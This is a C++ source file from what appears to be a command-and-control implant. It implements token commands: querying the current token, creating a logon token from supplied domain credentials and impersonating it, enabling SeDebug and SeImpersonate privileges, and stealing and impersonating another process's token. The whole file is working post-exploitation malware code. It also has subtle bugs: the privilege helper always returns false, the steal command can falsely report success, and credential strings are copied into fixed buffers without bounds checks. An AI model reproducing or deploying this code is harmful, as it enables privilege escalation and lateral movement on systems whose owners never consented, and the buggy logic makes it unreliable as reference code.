#include "Command.h"
#include "Implant.h"

typedef struct {
    CHAR  OwnerName[256];
    DWORD Type;
} TOKEN_INFO, *PTOKEN_INFO;

// return token owner name
BOOL GetTokenInfo( HANDLE TokenHandle, TOKEN_INFO* TokenInfo ) {
    DWORD             TokenStatisticsLen = 0;
    PTOKEN_STATISTICS TokenStatistics    = NULL;
    DWORD             TokenUserLen       = 0;
    PTOKEN_USER       TokenUser          = NULL;
    CHAR              Domain[256]        = { 0 };
    CHAR              Username[256]      = { 0 };
    DWORD             UsernameLength     = 256;
    DWORD             DomainLength       = 256;
    SID_NAME_USE      Sid;

    // Get token statistics struct size
    if (!GetTokenInformation( TokenHandle, TOKEN_INFORMATION_CLASS::TokenStatistics, NULL, 0, &TokenStatisticsLen )) {

        // Allocate token statistics struct
        TokenStatistics = (PTOKEN_STATISTICS)RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, TokenStatisticsLen );
        if (!TokenStatistics) {
            printf( "[-] failed to allocate heap for TokenStatistics" );
            return FALSE;
        }

        // Get token type
        if (GetTokenInformation( TokenHandle, TOKEN_INFORMATION_CLASS::TokenStatistics, TokenStatistics, TokenStatisticsLen, &TokenStatisticsLen )) {
            if (TokenStatistics->TokenType == TokenPrimary) {
                TokenInfo->Type = TokenPrimary;
            } else if (TokenStatistics->TokenType == TokenImpersonation) {
                TokenInfo->Type = TokenImpersonation;
            }
        }

        RtlFreeHeap( GetProcessHeap(), 0, TokenStatistics );
    }

    // Get token owner name
    if (!GetTokenInformation( TokenHandle, TOKEN_INFORMATION_CLASS::TokenUser, NULL, 0, &TokenUserLen )) {

        // Allocate token statistics struct
        TokenUser = (PTOKEN_USER)RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, TokenUserLen );
        if (!TokenUser) {
            printf( "[-] failed to allocate heap for TokenUser" );
            return FALSE;
        }

        // Get token type
        if (GetTokenInformation( TokenHandle, TOKEN_INFORMATION_CLASS::TokenUser, TokenUser, TokenUserLen, &TokenUserLen )) {
            if (LookupAccountSidA( NULL, TokenUser->User.Sid, Username, &UsernameLength, Domain, &DomainLength, &Sid )) {
                sprintf_s( TokenInfo->OwnerName, 256, "%s/%s", Domain, Username );
            } else {
                sprintf_s( TokenInfo->OwnerName, 256, "%s/%s", "(null)", "(null)" );
            }
        }

        RtlFreeHeap( GetProcessHeap(), 0, TokenUser );
    }

    return TRUE;
}

BOOL CommandTokenInfo( json& args, string artifact, json& result ) {
    HANDLE     TokenHandle;
    TOKEN_INFO TokenInfo;
    json       TokenInfoObject;

    if (!OpenProcessToken( GetCurrentProcess(), TOKEN_READ, &TokenHandle )) {
        printf( "[-] Failed to open handle to current process token\n" );
        return FALSE;
    }

    // Access token
    if (GetTokenInfo( TokenHandle, &TokenInfo )) {
        printf( "Access Token: %s\n", TokenInfo.OwnerName );
        TokenInfoObject["access_token"] = TokenInfo.OwnerName;
    } else {
        TokenInfoObject["access_token"] = "";
    }

    // Impersonation token
    if (GetTokenInfo( GetCurrentThreadToken(), &TokenInfo )) {
        printf( "Impersonated Client: %s\n", TokenInfo.OwnerName );
        TokenInfoObject["impersonation_token"] = TokenInfo.OwnerName;
    } else {
        TokenInfoObject["impersonation_token"] = "";
    }

    result["name"]     = "token.info";
    result["artifact"] = TokenInfoObject.dump();

    CloseHandle( TokenHandle );
    return TRUE;
}

BOOL CommandTokenRev2Self( json& args, string artifact, json& result ) {
    RevertToSelf();

    g_Implant.IsImpersonating = FALSE;

    result["name"]   = "token.rev2self";
    result["output"] = "token reverted";
    return TRUE;
}

BOOL CommandTokenMake( json& args, string artifact, json& result ) {
    HANDLE TokenHandle         = NULL;
    string Domain              = args[0].get<string>();
    string Username            = args[1].get<string>();
    string Password            = args[2].get<string>();
    string Output              = "";
    CHAR   DomainBuffer[256]   = { 0 };
    CHAR   UsernameBuffer[256] = { 0 };
    CHAR   PasswordBuffer[256] = { 0 };
    BOOL   Status              = FALSE;

    if (g_Implant.IsImpersonating) {
        RevertToSelf();
    }

    strcpy( DomainBuffer, Domain.c_str() );
    strcpy( UsernameBuffer, Username.c_str() );
    strcpy( PasswordBuffer, Password.c_str() );

    result["name"] = "token.make";

    if (!LogonUserA( UsernameBuffer, DomainBuffer, PasswordBuffer, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &TokenHandle )) {
        printf( "[-] LogonUserA failed: ( %ld )", GetLastError() );
        goto End;
    }

    if (!ImpersonateLoggedOnUser( TokenHandle )) {
        printf( "[-] ImpersonateLoggedOnUser failed: ( %ld )\n", GetLastError() );
        goto End;
    }

    g_Implant.IsImpersonating = TRUE;
    Status                    = TRUE;
    Output += "Impersonating ( " + Domain + "\\" + Username + ")";

End:
    if (Status) {
        result["output"] = Output;
    } else {
        result["output"] = "failed to impersonate user";
    }

    if (TokenHandle)
        CloseHandle( TokenHandle );

    return Status;
}

BOOL SetPrivilege( HANDLE TokenHandle, LPCTSTR PrivilegeName, BOOL Enable ) {
    TOKEN_PRIVILEGES tp;
    LUID             luid;

    if (!LookupPrivilegeValue( NULL, PrivilegeName, &luid )) {
        printf( "LookupPrivilegeValue failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }

    tp.PrivilegeCount     = 1;
    tp.Privileges[0].Luid = luid;

    if (Enable) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    } else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges( TokenHandle, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), NULL, NULL )) {
        printf( "AdjustTokenPrivileges failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf( "The token does not have the specified privilege. \n" );
        return FALSE;
    }

    return TRUE;
}

BOOL EnablePrivilege( LPCTSTR PrivilegeName ) {
    HANDLE           TokenHandle;
    TOKEN_PRIVILEGES tp;
    LUID             luid;

    OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle );

    if (!LookupPrivilegeValue( NULL, PrivilegeName, &luid )) {
        printf( "LookupPrivilegeValue failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges( TokenHandle, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), NULL, NULL )) {
        printf( "AdjustTokenPrivileges failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf( "The token does not have the specified privilege. \n" );
        return FALSE;
    }

    return FALSE;
}

BOOL CommandTokenSteal( json& args, string artifact, json& result ) {
    DWORD  ProcessID      = args[0].get<DWORD>();
    HANDLE TokenHandle    = NULL;
    HANDLE ProcessHandle  = NULL;
    HANDLE DupTokenHandle = NULL;
    BOOL   Status         = TRUE;
    char   Username[256]  = { 0 };
    DWORD  UsernameSize   = sizeof( Username );

    if (g_Implant.IsImpersonating) {
        RevertToSelf();
    }

    if (!EnablePrivilege( SE_IMPERSONATE_NAME )) {
        goto End;
    }

    if (!EnablePrivilege( SE_DEBUG_NAME )) {
        goto End;
    }

    // Open handle to process
    ProcessHandle = OpenProcess( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
    if (!ProcessHandle) {
        printf( "[-] Failed to open handle to process ( %ld )\n", ProcessID );
        goto End;
    }

    // Open handle to process token
    if (!OpenProcessToken( ProcessHandle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &TokenHandle )) {
        printf( "[-] Failed to open handle to process token\n" );
        goto End;
    }

    // Duplicate token
    if (!DuplicateTokenEx( TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DupTokenHandle )) {
        printf( "[-] DuplicateTokenEx failed: ( %ld )\n", GetLastError() );
        goto End;
    }

    // Use the token
    if (!ImpersonateLoggedOnUser( DupTokenHandle )) {
        printf( "[-] ImpersonateLoggedOnUser failed: ( %ld )\n", GetLastError() );
        goto End;
    }

    Status                    = TRUE;
    g_Implant.IsImpersonating = TRUE;

End:
    result["name"] = "token.steal";

    if (Status == TRUE) {
        result["output"] = "token stolen";
    } else {
        result["output"] = "failed to steal process token";
    }

    if (DupTokenHandle)
        CloseHandle( DupTokenHandle );
    if (TokenHandle)
        CloseHandle( TokenHandle );
    if (ProcessHandle)
        CloseHandle( ProcessHandle );

    return Status;
}
